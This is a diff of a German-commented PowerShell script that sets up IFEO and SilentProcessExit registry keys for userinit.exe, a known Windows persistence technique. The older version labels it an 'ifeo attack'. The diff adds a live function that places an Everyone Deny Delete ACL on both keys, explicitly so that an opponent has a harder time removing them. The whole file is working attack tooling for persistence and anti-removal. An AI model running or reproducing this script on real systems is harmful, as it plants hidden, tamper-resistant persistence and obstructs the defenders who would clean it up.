@@ -1,33 +1,70 @@
+#Requires -RunAsAdministrator
+<#
+.SYNOPSIS
+    Erstellt einen IFEO Eintrag, der die Flag setzt.
+
+
+    Setzt ACL-Schutz (Deny Delete) auf die SilentProcessExit- und IFEO-Schlüssel
+    für userinit.exe, um das Löschen durch den Gegner zu erschweren.
+#>
+
 $targetProcess = "userinit.exe"
 
 $ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$targetProcess"
 $spePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$targetProcess"
 
-Write-Host ""
-Write-Host "=== ifeo attack ===" -ForegroundColor Cyan
+function Set-RegistryDenyDelete {
+    param ([string]$RegistryPath)
 
+    Write-Host "[*] Verarbeite: $RegistryPath"
 
-function Set-RegistryKeyACL {
-    param([string]$Path)
+    # Prüfen ob der Schlüssel existiert
+    $testPath = $RegistryPath
+    if (-not (Test-Path $testPath)) {
+        Write-Warning "    Schlüssel existiert nicht, überspringe: $testPath"
+        return
+    }
 
-    $acl = Get-Acl $Path
-    $acl.SetAccessRuleProtection($true, $false)
+    # HKLM:\ für OpenSubKey entfernen
+    $cleanPath = $RegistryPath -replace "^HKLM:\\", ""
 
-    $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule(
-        "SYSTEM", "FullControl", "Allow"
-    )))
-    $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule(
-        "Administrators", "ReadKey", "Allow"
-    )))
+    try {
+        # Schlüssel mit ChangePermissions-Recht öffnen
+        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
+            $cleanPath,
+            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
+            [System.Security.AccessControl.RegistryRights]::ChangePermissions
+        )
 
-    Set-Acl -Path $Path -AclObject $acl
+        if ($null -eq $key) {
+            Write-Warning "    Konnte Schlüssel nicht öffnen (keine Rechte?): $RegistryPath"
+            return
+        }
+
+        $acl = $key.GetAccessControl()
+
+        # Deny Delete für Everyone setzen
+        $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
+            "Everyone",
+            [System.Security.AccessControl.RegistryRights]::Delete,
+            [System.Security.AccessControl.InheritanceFlags]::None,
+            [System.Security.AccessControl.PropagationFlags]::None,
+            [System.Security.AccessControl.AccessControlType]::Deny
+        )
+
+        $acl.AddAccessRule($rule)
+        $key.SetAccessControl($acl)
+        $key.Close()
+
+        Write-Host "    [+] Deny Delete gesetzt." -ForegroundColor Green
+
+    } catch {
+        Write-Error "    Fehler bei $RegistryPath`: $_"
+    }
 }
 
 
 try {
-    Write-Host ""
-    Write-Host "- initiate silent process exit" -ForegroundColor Cyan
-
     # IFEO-Schluessel erstellen
     New-Item -Path $ifeoPath -Force
 
@@ -37,10 +74,6 @@ try {
         -Value 512 `
         -PropertyType DWORD `
         -Force
-
-
-    Write-Host ""
-    Write-Host "- set silent process exit" -ForegroundColor Cyan
 
     # SilentProcessExit-Schluessel erstellen
     New-Item -Path $spePath -Force
@@ -59,15 +92,10 @@ try {
         -PropertyType DWORD `
         -Force
 
-    # Write-Host ""
-    # Write-Host "- set ACL on registry keys" -ForegroundColor Cyan
 
-    # # ACL auf beide Registry-Schluessel setzen
-    # # Set-RegistryKeyACL $ifeoPath
-    # # Set-RegistryKeyACL $spePath
-
-    # Write-Host ""
-    # Write-Host "- done" -ForegroundColor Cyan
+    # ACL auf beide Registry-Schluessel setzen
+    Set-RegistryDenyDelete $ifeoPath
+    Set-RegistryDenyDelete $spePath
 
 } catch {
     Write-Host "IFEO was not successful: $_" -ForegroundColor Yellow
